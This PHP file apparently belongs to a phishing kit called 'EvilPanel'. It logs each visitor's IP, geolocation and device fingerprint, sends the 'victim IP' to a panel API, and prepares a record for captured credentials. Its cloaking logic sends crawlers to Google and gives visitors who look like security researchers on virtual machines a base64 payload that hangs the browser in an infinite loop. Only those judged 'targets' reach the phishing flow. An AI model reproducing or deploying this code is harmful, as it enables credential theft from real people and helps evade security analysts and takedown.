<?php
// ip.php - v3.0 - Unified Logging & Geo-Triage Engine

// --- INITIALIZATION ---
error_reporting(0);
ini_set('log_errors', 1);
ini_set('error_log', 'php_errors.log');
date_default_timezone_set("Asia/Manila");

$log_file = 'sessions.json';

// --- EVILPANEL API CONFIG ---
$evilpanel_api = 'http://127.0.0.1:8080/api/set-victim-ip';  // Local API on VPS

// --- DATA CAPTURE ---
$fingerprint_data = json_decode(file_get_contents('php://input'), true);
$ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

// --- NOTIFY EVILPANEL OF VICTIM IP (for geo-proxy matching) ---
function notify_evilpanel($api_url, $ip, $session_id) {
    $ch = curl_init($api_url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(['ip' => $ip, 'session_id' => $session_id]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_CONNECTTIMEOUT => 2
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Send victim IP to EvilPanel (async, non-blocking)
if ($ip_address !== 'UNKNOWN') {
    @notify_evilpanel($evilpanel_api, $ip_address, $fingerprint_data['sessionId'] ?? '');
}
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// --- SESSIONID VALIDATION & FALLBACK ---
$sessionId = $fingerprint_data['sessionId'] ?? 'NO_SESSION_ID_' . uniqid();
if ($sessionId === 'NO_SESSION_ID' || empty($sessionId)) {
    // Generate server-side fallback
    $sessionId = 'SERVER_' . bin2hex(random_bytes(16));
    error_log("[CRITICAL] Client sessionId missing, generated fallback: $sessionId");
}

// --- FUNCTIONS ---

function validate_mobile_fingerprint($fingerprint) {
    $errors = [];
    
    // Validate sensor data presence
    if (!isset($fingerprint['mobileSensors']) || empty($fingerprint['mobileSensors'])) {
        $errors[] = "Missing mobile sensor data";
    } else {
        $mobile_sensors = $fingerprint['mobileSensors'];
        
        // Validate gyroscope data
        if (!isset($mobile_sensors['gyroscope']) || empty($mobile_sensors['gyroscope'])) {
            $errors[] = "Missing gyroscope data";
        } else {
            foreach ($mobile_sensors['gyroscope'] as $reading) {
                if (isset($reading['alpha'])) {
                    if (!is_numeric($reading['alpha']) || $reading['alpha'] < 0 || $reading['alpha'] > 360) {
                        $errors[] = "Invalid gyroscope alpha value";
                    }
                }
                if (isset($reading['beta'])) {
                    if (!is_numeric($reading['beta']) || $reading['beta'] < -180 || $reading['beta'] > 180) {
                        $errors[] = "Invalid gyroscope beta value";
                    }
                }
                if (isset($reading['gamma'])) {
                    if (!is_numeric($reading['gamma']) || $reading['gamma'] < -90 || $reading['gamma'] > 90) {
                        $errors[] = "Invalid gyroscope gamma value";
                    }
                }
            }
        }
        
        // Validate accelerometer data
        if (!isset($mobile_sensors['accelerometer']) || empty($mobile_sensors['accelerometer'])) {
            $errors[] = "Missing accelerometer data";
        } else {
            foreach ($mobile_sensors['accelerometer'] as $reading) {
                if (isset($reading['x'])) {
                    if (!is_numeric($reading['x']) || $reading['x'] < -20 || $reading['x'] > 20) {
                        $errors[] = "Invalid accelerometer x value";
                    }
                }
                if (isset($reading['y'])) {
                    if (!is_numeric($reading['y']) || $reading['y'] < -20 || $reading['y'] > 20) {
                        $errors[] = "Invalid accelerometer y value";
                    }
                }
                if (isset($reading['z'])) {
                    if (!is_numeric($reading['z']) || $reading['z'] < -20 || $reading['z'] > 20) {
                        $errors[] = "Invalid accelerometer z value";
                    }
                }
            }
        }
    }
    
    // Validate touch patterns
    if (isset($fingerprint['touchPatterns']) && !empty($fingerprint['touchPatterns'])) {
        foreach ($fingerprint['touchPatterns'] as $touch) {
            if (isset($touch['pressure'])) {
                if (!is_numeric($touch['pressure']) || $touch['pressure'] < 0 || $touch['pressure'] > 1) {
                    $errors[] = "Invalid touch pressure";
                }
            }
            if (isset($touch['radiusX'])) {
                if (!is_numeric($touch['radiusX']) || $touch['radiusX'] < 0) {
                    $errors[] = "Invalid touch radiusX";
                }
            }
            if (isset($touch['radiusY'])) {
                if (!is_numeric($touch['radiusY']) || $touch['radiusY'] < 0) {
                    $errors[] = "Invalid touch radiusY";
                }
            }
        }
    }
    
    // Validate orientation data
    if (isset($fingerprint['orientation'])) {
        $orientation = $fingerprint['orientation'];
        if (isset($orientation['type'])) {
            $valid_types = ['portrait-primary', 'portrait-secondary', 'landscape-primary', 'landscape-secondary'];
            if (!in_array($orientation['type'], $valid_types)) {
                $errors[] = "Invalid orientation type";
            }
        }
        if (isset($orientation['angle'])) {
            if (!is_numeric($orientation['angle']) || $orientation['angle'] < 0 || $orientation['angle'] > 360) {
                $errors[] = "Invalid orientation angle";
            }
        }
    }
    
    return count($errors) === 0;
}

function get_threat_assessment($fp, $ua) {
    if (isset($fp['webGLRenderer'])) {
        $renderer = strtolower($fp['webGLRenderer']);
        if (strpos($renderer, 'llvmpipe') !== false || strpos($renderer, 'swiftshader') !== false || strpos($renderer, 'virtualbox') !== false) {
            return ['level' => 2, 'reason' => 'VM/Software Renderer Detected'];
        }
    }
    if (isset($fp['hardwareConcurrency']) && $fp['hardwareConcurrency'] <= 2) {
        return ['level' => 2, 'reason' => 'Anomalous CPU Core Count (VM/Sandbox Signature)'];
    }
    $crawler_uas = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'yandexbot', 'ahrefsbot', 'semrushbot', 'petalbot'];
    foreach ($crawler_uas as $crawler) {
        if (stripos($ua, $crawler) !== false) {
            return ['level' => 1, 'reason' => 'Known Crawler User-Agent'];
        }
    }
    return ['level' => 0, 'reason' => 'All Checks Passed'];
}

function get_geolocation($ip) {
    if ($ip === 'UNKNOWN' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return ['country' => null, 'region' => null, 'city' => null, 'zip' => null, 'asn' => null, 'isp' => 'Invalid/Local IP', 'lat' => null, 'lon' => null];
    }
    $geo_data = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
    if ($geo_data && $geo_data['status'] == 'success') {
        preg_match('/AS(\d+)/', $geo_data['as'] ?? '', $asn_match);
        return [
            'country' => $geo_data['countryCode'] ?? null,
            'region' => $geo_data['regionName'] ?? null,
            'city' => $geo_data['city'] ?? null,
            'zip' => $geo_data['zip'] ?? null,
            'asn' => $asn_match[1] ?? null,
            'isp' => $geo_data['isp'] ?? null,
            'lat' => $geo_data['lat'] ?? null,
            'lon' => $geo_data['lon'] ?? null
        ];
    }
    return ['country' => null, 'region' => null, 'city' => null, 'zip' => null, 'asn' => null, 'isp' => 'Lookup Failed', 'lat' => null, 'lon' => null];
}

// --- MAIN EXECUTION ---
// Only execute if there's POST data OR it's a direct call (not included)
$is_post_request = !empty($fingerprint_data) && is_array($fingerprint_data);
$is_direct_call = isset($_SERVER['PHP_SELF']) && basename($_SERVER['PHP_SELF']) === 'ip.php';

if ($is_post_request || $is_direct_call) {
    // 1. Validate mobile fingerprint data
    $mobile_validation = validate_mobile_fingerprint($fingerprint_data);
    if (!$mobile_validation) {
        error_log("[WARNING] Mobile fingerprint validation failed for session: $sessionId");
    }

    // 2. Assess threat and get geolocation
    $threat = get_threat_assessment($fingerprint_data, $user_agent);
    $location = get_geolocation($ip_address);

    // 2. Build the complete, unified log entry
    $log_entry = [
        'sessionId' => $sessionId, // Use validated sessionId
        'timestamp_first_seen' => date('Y-m-d H:i:s'),
        'ip_address' => $ip_address,
        'threat' => $threat,
        'location' => $location,
        'fingerprint' => $fingerprint_data,
        'credentials' => [] // Initialize empty array for login.php to append to
    ];

    // 3. Atomically append to the unified log file
    $handle = fopen($log_file, 'c+');
    if (flock($handle, LOCK_EX)) {
        $contents = fread($handle, filesize($log_file) ?: 1);
        $data = json_decode(rtrim($contents, ",\n") . ']', true);
        if (!is_array($data)) {
            $data = [];
        }
        $data[] = $log_entry;
        ftruncate($handle, 0);
        rewind($handle);
        fwrite($handle, "[\n" . rtrim(implode(",\n", array_map('json_encode', $data)), ",\n") . "\n]");
        flock($handle, LOCK_UN);
    }
    fclose($handle);

    // 4. Prepare and dispatch the command to the client
    $response = [];
    switch ($threat['level']) {
        case 2: // Researcher
            $response['action'] = 'EXECUTE_PAYLOAD';
            $response['payload'] = 'd2hpbGUodHJ1ZSl7fQ=='; // Base64 for while(true){}
            break;
        case 1: // Bot
            $response['action'] = 'REDIRECT';
            $response['url'] = 'https://www.google.com';
            break;
        default: // Target
        case 0:
            $response['action'] = 'PROCEED';
            break;
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit();
}
?>